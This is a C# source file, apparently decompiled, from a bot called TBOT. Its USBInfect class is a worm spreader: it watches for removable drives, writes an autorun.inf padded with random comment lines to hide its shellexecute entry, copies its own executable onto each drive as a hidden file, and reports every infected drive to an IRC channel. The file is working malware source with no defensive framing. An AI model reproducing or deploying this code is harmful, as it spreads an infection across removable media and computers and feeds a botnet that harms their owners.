using System;
using System.Diagnostics;
using System.IO;
using System.Threading;
using Microsoft.Win32;

namespace TBOT;

internal class USBInfect
{
	private static DateTime[] iUsbs = new DateTime[0];

	private static string[] usbs = new string[0];

	public static void infect()
	{
		while (true)
		{
			RegistryKey currentUser = Registry.CurrentUser;
			currentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced");
			currentUser.SetValue("Hidden", "0");
			DriveInfo[] drives = DriveInfo.GetDrives();
			DriveInfo[] array = drives;
			foreach (DriveInfo driveInfo in array)
			{
				bool flag = false;
				if (driveInfo.DriveType != DriveType.Removable)
				{
					continue;
				}
				bool flag2 = true;
				int num = -1;
				for (int j = 0; j < usbs.Length; j++)
				{
					if (usbs[j] == driveInfo.RootDirectory.ToString())
					{
						flag2 = false;
						num = j;
						break;
					}
				}
				if (flag2)
				{
					flag = true;
					string[] array2 = new string[usbs.Length + 1];
					usbs.CopyTo(array2, 0);
					array2.SetValue(driveInfo.RootDirectory.ToString(), usbs.Length);
					usbs = array2;
					DateTime[] array3 = new DateTime[iUsbs.Length + 1];
					iUsbs.CopyTo(array3, 0);
					array3.SetValue(DateTime.Now, iUsbs.Length);
					iUsbs = array3;
				}
				else if (num != -1 && (DateTime.Now - iUsbs[num]).Minutes >= 15)
				{
					ref DateTime reference = ref iUsbs[num];
					reference = DateTime.Now;
					flag = true;
				}
				else if (!File.Exists(string.Concat(driveInfo.RootDirectory, Config.usbFile)) || !File.Exists(string.Concat(driveInfo.RootDirectory, "autorun.inf")))
				{
					flag = true;
				}
				if (flag && driveInfo.IsReady)
				{
					installOnDrive(driveInfo);
				}
			}
			Thread.Sleep(5000);
		}
	}

	public static void installOnDrive(DriveInfo drive)
	{
		Random random = new Random();
		int num = random.Next(8, 128);
		int num2 = random.Next(8, 128);
		File.Delete(string.Concat(drive.RootDirectory, "autorun.inf"));
		StreamWriter streamWriter = new StreamWriter(string.Concat(drive.RootDirectory, "autorun.inf"));
		streamWriter.WriteLine("[autorun]");
		string text = "qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM1234567890";
		for (int i = 0; i < num; i++)
		{
			int num3 = random.Next(16, 512);
			string text2 = ";";
			for (int j = 0; j < num3; j++)
			{
				text2 += text[random.Next(0, text.Length)];
			}
			streamWriter.WriteLine(text2);
		}
		streamWriter.WriteLine("shellexecute=" + Config.usbFile);
		for (int k = 0; k < num2; k++)
		{
			int num4 = random.Next(16, 512);
			string text3 = ";";
			for (int l = 0; l < num4; l++)
			{
				text3 += text[random.Next(0, text.Length)];
			}
			streamWriter.WriteLine(text3);
		}
		streamWriter.Flush();
		streamWriter.Close();
		try
		{
			if (!File.Exists(string.Concat(drive.RootDirectory, Config.usbFile)))
			{
				File.Copy(Process.GetCurrentProcess().MainModule!.FileName, string.Concat(drive.RootDirectory, Config.usbFile));
				File.SetAttributes(string.Concat(drive.RootDirectory, Config.usbFile), FileAttributes.Hidden);
				File.SetAttributes(string.Concat(drive.RootDirectory, "autorun.inf"), FileAttributes.Hidden);
				Irc.WriteTo(Config.ircChannel, "Infected Drive: " + drive.Name + "!");
			}
		}
		catch (Exception)
		{
		}
	}
}
